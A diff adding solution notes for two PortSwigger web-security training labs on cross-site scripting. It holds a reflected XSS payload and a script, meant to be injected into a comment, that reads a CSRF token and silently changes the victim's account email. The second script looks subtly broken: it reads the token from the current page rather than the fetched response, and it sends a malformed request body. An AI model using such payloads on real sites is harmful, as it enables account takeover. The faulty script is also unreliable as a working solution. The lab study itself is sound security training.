@@ -1,0 +1,26 @@
+[lab: Reflected XSS into HTML context with nothing encoded]
+url: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
+solution: <script>alert(1);</script>
+
+[lab: Exploiting XSS to perform CSRF]
+url: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
+solution:
+    step-1: open lab at change email
+    step-2: use console to return csrf with following cmd: document.getElementsByName("csrf")[0].value
+    step-3: build (for the comment field) a nested xmlhttp request:
+<script>
+  var r1 = new XMLHttpRequest();
+  r1.onload = doIt;
+  r1.open("GET", "/email",true);
+  r1.send();
+
+  function doIt() {
+        console.log(document.getElementsByName("csrf")[0].value);
+        var csrf = document.getElementsByName("csrf")[0].value;
+        var r2 = new XMLHttpRequest();
+        var x = "name=email&value=lucifer@gmail.com&name=csrf&value="+csrf;
+        console.log("email changed");
+        r2.open("POST", "/email/change-email");
+        r2.send(x);
+  };
+</script>
